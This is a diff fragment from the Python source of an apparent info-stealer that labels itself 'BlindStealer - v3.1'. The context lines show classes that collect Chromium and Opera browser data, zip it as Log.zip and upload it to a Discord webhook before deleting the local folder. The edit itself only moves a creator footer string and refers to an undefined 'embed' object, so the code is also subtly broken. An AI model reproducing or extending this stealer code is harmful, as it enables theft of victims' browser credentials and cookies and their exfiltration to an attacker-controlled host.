@@ -19,6 +19,7 @@ __CARDS__ = []
 class Browsers:
     def __init__(self, webhook):
         self.webhook = SyncWebhook.from_url(webhook)
+        embed.set_footer(text="Blind v3.1 · Created by: readdone#1155")
 
         Chromium()
         Opera()
@@ -27,6 +28,7 @@ class Browsers:
 class Upload:
     def __init__(self, webhook: SyncWebhook):
         self.webhook = webhook
+        embed.set_footer(text="Blind v3.1 · Created by: readdone#1155")
 
         self.write_files()
         self.send()
@@ -68,7 +70,6 @@ class Upload:
             file=File("Log.zip"),
                 username="BlindStealer - v3.1",
                 avatar_url="https://i.imgur.com/LNVOaxg.png",
-                footer="Blind v3.1 · Created by: readdone#1155",
         ) 
     def clean(self):
         shutil.rmtree("Log")
